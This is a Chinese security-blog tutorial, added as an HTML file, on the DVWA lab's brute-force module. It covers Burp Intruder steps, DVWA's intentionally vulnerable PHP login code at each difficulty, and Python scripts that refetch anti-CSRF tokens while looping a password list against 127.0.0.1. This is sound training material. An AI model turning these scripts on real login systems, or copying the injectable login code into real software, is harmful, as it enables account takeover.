@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DVWA 靶场 Brute Force（暴力破解）全难度教程（附代码分析） - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=DVWA" class="tag tag-cyan">#DVWA</a>
+    <a href="../tags/list.html?tag=暴力破解" class="tag tag-orange">#暴力破解</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 03 / 28</div>
+  <div class="post-title">DVWA 靶场 Brute Force（暴力破解）全难度教程（附代码分析）</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</span>
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">DVWA</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">暴力破解</span>
+  </div>
+</div>
+
+<div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<nav class="post-toc">
+  <span class="post-toc-title">// 目录</span>
+  <ul>
+    <li class="toc-h4"><a href="#intro">简介与 OWASP BWA</a></li>
+    <li class="toc-h4"><a href="#principle">暴力破解原理</a></li>
+    <li class="toc-h4"><a href="#low">Low 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#low-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#low-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#medium">Medium 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#medium-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#medium-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#high">High 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#high-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#high-script">Python 脚本</a></li>
+        <li class="toc-h5"><a href="#high-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#impossible">Impossible 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#impossible-code">代码分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h4 id="intro">简介与 OWASP BWA</h4>
+
+<p>建议使用 owaspbwa 靶场可以不用搭建 DVWA 以及其他常用靶场，省去搭建靶场的困扰，但是此靶机靶场较老，并不建议使用。</p>
+
+<p>owaspbwa 下载地址：<a href="https://sourceforge.net/projects/owaspbwa/files/">OWASP Broken Web Applications Project</a></p>
+
+<p>注：owaspbwa 的本机用户名 root 密码 owaspbwa，记得看看靶机的 IP 方便以后使用。DVWA 的用户名和密码都为 admin（owaspbwa 中的 DVWA 是此，其他的用户名为 admin 密码为 password）。</p>
+
+<h4 id="principle">暴力破解原理</h4>
+
+<p>利用抓包软件抓包，来不断对单个用户名穷举密码的操作。</p>
+
+<p>注：密码本和用户名本里面应当有所谓的用户名和密码。</p>
+
+<h4 id="low">Low 难度</h4>
+
+<h5 id="low-exploit">漏洞利用</h5>
+
+<p>打开 Burp 对此网站抓包，用户和密码随便输入，只是为了抓包：</p>
+
+<p><img src="../assets/bf_image001.png" alt="" style="max-width:100%"></p>
+
+<p>将此数据包发送到 Intruder 模块：</p>
+
+<p><img src="../assets/bf_image002.png" alt="" style="max-width:100%"></p>
+
+<p><img src="../assets/bf_image003.png" alt="" style="max-width:100%"></p>
+
+<p>这里会有几个标出来的字段，直接选择 Clear，选中需要爆破的 username 和 password 的值利用 Add 添加（也可以直接爆破密码，前提是要知道用户名，建议直接 admin）：</p>
+
+<p><img src="../assets/bf_image004.png" alt="" style="max-width:100%"></p>
+
+<p>选中 Payloads 模块进行设置，直接在 Payload Options 选择 Load 去添加字典，或者用 Add 添加单个字段：</p>
+
+<p><img src="../assets/bf_image005.png" alt="" style="max-width:100%"></p>
+
+<p>点击右上角的 Start Attack 就行，等待一下就可以。通过 Status 和 Length 筛选可以看到密码：</p>
+
+<p><img src="../assets/bf_image006.png" alt="" style="max-width:100%"></p>
+
+<h5 id="low-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Get username
+    $user = $_GET[ 'username' ];
+
+    // Get password
+    $pass = $_GET[ 'password' ];
+    $pass = md5( $pass );
+
+    // Check the database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row["avatar"];
+
+        // Login successful
+        echo "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";
+        echo "&lt;img src=\"{$avatar}\" /&gt;";
+    }
+    else {
+        // Login failed
+        echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</code></pre>
+
+<p>就是一个只实现了登录的代码，只是对密码进行 md5 加密，防止我们通过密码进行 SQL 注入（可以使用 username 进行 SQL 注入），可没有对账号的登录尝试次数做限制。</p>
+
+<h4 id="medium">Medium 难度</h4>
+
+<h5 id="medium-exploit">漏洞利用</h5>
+
+<p>与上一难度一样，但是需要设置时停。修改 Burp 的 Resource Pool 模块（本模块是修改攻击速度）：</p>
+
+<p><img src="../assets/bf_image007.png" alt="" style="max-width:100%"></p>
+
+<p>按此配置就行，可以试试能不能更快爆破，只要大于网站要求请求时间即可。结果与上面一样（爆破会很慢的，就不放出来了）。</p>
+
+<h5 id="medium-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Sanitise username input
+    $user = $_GET[ 'username' ];
+    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitise password input
+    $pass = $_GET[ 'password' ];
+    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass = md5( $pass );
+
+    // Check the database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row["avatar"];
+
+        // Login successful
+        echo "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";
+        echo "&lt;img src=\"{$avatar}\" /&gt;";
+    }
+    else {
+        // Login failed
+        sleep( 2 );
+        echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</code></pre>
+
+<p>这边的代码加上了一个延迟两秒才能下一个，所以延长了爆破时间，增加的是时间成本。</p>
+
+<p><code>mysqli_real_escape_string(string, connection)</code>：函数会对字符串 string 中的特殊符号（\x00, \n, \r, \, ', ", \x1a）进行转义，基本可以抵抗 SQL 注入。</p>
+
+<h4 id="high">High 难度</h4>
+
+<h5 id="high-exploit">漏洞利用</h5>
+
+<p>建议看看 token 是否正常，建议用 Linux。</p>
+
+<p>前面一样，修改 Options 下的 Grep-Extract：</p>
+
+<p><img src="../assets/bf_image008.png" alt="" style="max-width:100%"></p>
+
+<p><img src="../assets/bf_image009.png" alt="" style="max-width:100%"></p>
+
+<p>找到 token，先修改值，再单击 Refetch Response：</p>
+
+<p><img src="../assets/bf_image010.png" alt="" style="max-width:100%"></p>
+
+<p>将 Payloads 下的 Payload Set 改为 2，就可以攻击了。</p>
+
+<h5 id="high-script">Python 脚本</h5>
+
+<p>Python 2.x 脚本：</p>
+
+<pre><code>from bs4 import BeautifulSoup
+import urllib2
+header={'Host':'127.0.0.1',
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+        'Referer':'http://127.0.0.1/vulnerabilities/brute/',
+        'cookie':'PHPSESSID=6oqhn9tsrs80rbf3h4cvjutnn6; security=high',
+        'Connection':'close',
+        'Upgrade-Insecure-Requests':'1'
+        }
+requrl="http://127.0.0.1/vulnerabilities/brute/"
+
+def get_token(requrl,header):
+    req=urllib2.Request(url=requrl,headers=header)
+    response=urllib2.urlopen(req)
+    print response.getcode(),
+    the_page=response.read()
+    print len(the_page)
+    soup=BeautifulSoup(the_page,"html.parser")
+    input=soup.form.select("input[type='hidden']")
+    user_token=input[0]['value']
+    return user_token
+
+user_token=get_token(requrl,header)
+i=0
+for line in open("E:\Password\mima.txt"):
+    requrl="http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password="+line.strip()+"&amp;Login=Login&amp;user_token="+user_token
+    i=i+1
+    print i , 'admin' ,line.strip(),
+    user_token=get_token(requrl,header)
+    if(i==20):
+        break</code></pre>
+
+<p>Python 3.x 脚本：</p>
+
+<pre><code>from bs4 import BeautifulSoup
+import requests
+
+header={'Host':'127.0.0.1',
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+        'Referer':'http://127.0.0.1/vulnerabilities/brute/',
+        'cookie':'PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high',
+        'Connection':'close',
+        'Upgrade-Insecure-Requests':'1'
+        }
+requrl="http://127.0.0.1/vulnerabilities/brute/"
+
+def get_token(requrl,header):
+    response=requests.get(url=requrl,headers=header)
+    print (response.status_code,len(response.content))
+    soup=BeautifulSoup(response.text,"html.parser")
+    input=soup.form.select("input[type='hidden']")
+    user_token=input[0]['value']
+    return user_token
+
+user_token=get_token(requrl,header)
+i=0
+for line in open("E:\Password\mima.txt"):
+    requrl="http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password="+line.strip()+"&amp;Login=Login&amp;user_token="+user_token
+    i=i+1
+    print (i , 'admin' ,line.strip(),end="  ")
+    user_token=get_token(requrl,header)
+    if(i==20):
+        break</code></pre>
+
+<p>参考自：<a href="https://blog.csdn.net/qq_36119192/article/details/82938424">DVWA之Brute Force(暴力破解)</a>。这个自己跑下吧。</p>
+
+<h5 id="high-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input
+    $user = $_GET[ 'username' ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitise password input
+    $pass = $_GET[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass = md5( $pass );
+
+    // Check database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row["avatar"];
+
+        // Login successful
+        echo "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";
+        echo "&lt;img src=\"{$avatar}\" /&gt;";
+    }
+    else {
+        // Login failed
+        sleep( rand( 0, 3 ) );
+        echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+
+<p>前面的防护基础上加上了 Anti-CSRF Token 来抵御 CSRF 的攻击，使用了 stripslashes 函数和 mysqli_real_escape_string 来抵御 SQL 注入和 XSS 的攻击。由于使用了 Anti-CSRF Token，每次服务器返回的登录页面中都会包含一个随机的 user_token 的值，用户每次登录时都要将 user_token 一起提交。服务器收到请求后，会优先做 token 的检查，再进行 SQL 查询。</p>
+
+<h4 id="impossible">Impossible 难度</h4>
+
+<h5 id="impossible-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; isset ($_POST['password']) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input
+    $user = $_POST[ 'username' ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitise password input
+    $pass = $_POST[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass = md5( $pass );
+
+    // Default values
+    $total_failed_login = 3;
+    $lockout_time       = 15;
+    $account_locked     = false;
+
+    // Check the database (Check user information)
+    $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // Check to see if the user has been locked out.
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) )  {
+        // User locked out.
+        $last_login = strtotime( $row[ 'last_login' ] );
+        $timeout    = $last_login + ($lockout_time * 60);
+        $timenow    = time();
+
+        // Check to see if enough time has passed
+        if( $timenow &lt; $timeout ) {
+            $account_locked = true;
+        }
+    }
+
+    // Check the database (if username matches the password)
+    $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR);
+    $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // If its a valid login...
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {
+        // Get users details
+        $avatar       = $row[ 'avatar' ];
+        $failed_login = $row[ 'failed_login' ];
+        $last_login   = $row[ 'last_login' ];
+
+        // Login successful
+        echo "&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;";
+        echo "&lt;img src=\"{$avatar}\" /&gt;";
+
+        // Had the account been locked out since last login?
+        if( $failed_login &gt;= $total_failed_login ) {
+            echo "&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;";
+            echo "&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;";
+        }
+
+        // Reset bad login count
+        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
+        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    } else {
+        // Login failed
+        sleep( rand( 2, 4 ) );
+
+        // Give the user some feedback
+        echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;";
+
+        // Update bad login count
+        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
+        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    }
+
+    // Set the last login time
+    $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+
+<p>在上一难度的基础上对用户的操作做了限制，当登录失败 3 次后，账号会锁住 15 秒，同时采用了更为安全的 PDO（PHP Data Object）机制防御 SQL 注入，SQL 注入的关键就是通过破坏 SQL 语句结构执行恶意的 SQL 命令。</p>
+
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const html = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+themeBtn.textContent = saved === 'dark' ? '☽' : '☀';
+themeBtn.addEventListener('click', () => {
+  const cur = html.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  localStorage.setItem('theme', next);
+  themeBtn.textContent = next === 'dark' ? '☽' : '☀';
+});
+const topBtn = document.getElementById('backToTop');
+topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
+
+/* sticky nav */
+const navSentinel = document.getElementById('navSentinel');
+const navWrap = document.getElementById('navWrap');
+let navSpacer = null;
+const navObs = new IntersectionObserver(([e]) => {
+  const stuck = !e.isIntersecting;
+  navWrap.classList.toggle('fixed', stuck);
+  if (stuck && !navSpacer) {
+    navSpacer = document.createElement('div');
+    navSpacer.style.height = navWrap.offsetHeight + 'px';
+    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
+  } else if (!stuck && navSpacer) {
+    navSpacer.remove(); navSpacer = null;
+  }
+}, { threshold: [0] });
+navObs.observe(navSentinel);
+
+/* TOC active highlight */
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+/* code block header bar */
+document.querySelectorAll('.post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'code-wrapper';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'code-header';
+
+  const info = document.createElement('span');
+  info.className = 'code-header-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'code-header-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'code-btn code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'code-btn code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+</body>
+</html>
